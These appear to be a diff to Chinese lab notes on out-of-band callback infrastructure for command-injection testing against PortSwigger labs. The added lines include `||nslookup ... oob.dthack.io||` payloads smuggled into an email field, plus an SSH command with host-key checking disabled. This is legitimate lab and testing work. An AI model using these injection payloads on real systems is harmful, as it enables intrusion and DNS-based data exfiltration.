@@ -11,6 +11,12 @@ title: oob-callback-family
   (root nohup;`*.oob.dthack.io` 委派到此,通配解析;日志每行 JSON:ts/qname/qtype/src)。
 - **HTTP**:python3 http.server `0.0.0.0:9999` → 每个 GET 追加路径到 `/tmp/oob-http.log`
   (只记 path,无方法/头)。**回调 URL 形态:`http://ns.oob.dthack.io:9999/<marker>`**(A 记录 47.131.34.33,公网递归可解)。
+  - **易碎点(实测)**:该 listener 是单线程 `socketserver.TCPServer`,只要有一条外部连接不读完就整腿卡死。
+    复查快照:`ss -ltn` 里 `0.0.0.0:9999` 的 accept 队列饱和(Recv-Q 6/Send-Q 5),三条外部扫描源
+    (`194.88.98.93`、`5.226.140.14`、`193.176.31.200`)长期 ESTABLISHED,而**基座 loopback 探针同样 `code=000` 超时且日志不追加**
+    ⇒ 进程在、服务不在。恢复=重启该 python 进程或换 `ThreadingTCPServer`。
+  - 于是“9999 活”必须先自测:**从基座本机 loopback 打一次并看到日志追加**才算活,只看 `ps` 会误判。
+  - ssh 入口现为别名 `oob-server`(tailnet mesh `10.10.10.17`,公网回落 `oob-pub`);dns.log 的 qname 带 0x20 随机大小写,匹配一律 `grep -i`。
 - **deaddrop**:同机 `mgmt=9099 fetch=80`(反向回调面,`deaddrop.log`);80 与 9999 是两个不同 listener,别混。
 - 读日志(件外一条命令即可,约定):
   `sh_run -- ssh -o StrictHostKeyChecking=no ubuntu@47.131.34.33 'cat /tmp/oob-http.log'`
@@ -27,6 +33,13 @@ title: oob-callback-family
 - 结论同 b16:**lab 侧出站到自建 OOB 域不可达**(PortSwigger 仅放行其官方 Collaborator)。
   自建 OOB 腿对**本机发起**通;对 lab 发起不通。故这类 OOB 判定题在自建回调下无解,
   除非平台放行 lab 出站或改用官方 Collaborator-不是注入面问题。
+- **两腿判别器(本轮已跑,判词由“疑”转“定”)**:同一实例同一反馈面,
+  腿A `x@a.com||nslookup <m1>.oob.dthack.io 8.8.8.8||`(强制外部递归,绕开 lab 内置解析器),
+  腿B `x@a.com||nslookup <m2>.oob.dthack.io||`(走内置解析器);两腿提交均 200 `{}`,
+  95s 后 `dns.log` 中 m1/m2 **各 0 条**,http.log 亦 0。
+  ⇒ “lab 内置解析器是坑”这个替代解释被排除:强制 8.8.8.8 也不出,卡点是 lab 出站本身。
+  判别器前置(每次先绿):DoH 查 `<m>.oob.dthack.io` 必须带 `Response from 47.131.34.33`,
+  且同 marker 立刻在 `dns.log` 出现(本机侧那条注入查询)-本轮两条都绿,才敢把 lab 侧 0 条读成“出站被拦”。
 - 副产品:**输出重定向**技术可用于区分"注入未执行 vs 出站被挡"(把命令输出写进
   web 可读文件再取回);本次因未知 app docroot 未用它收口。
 
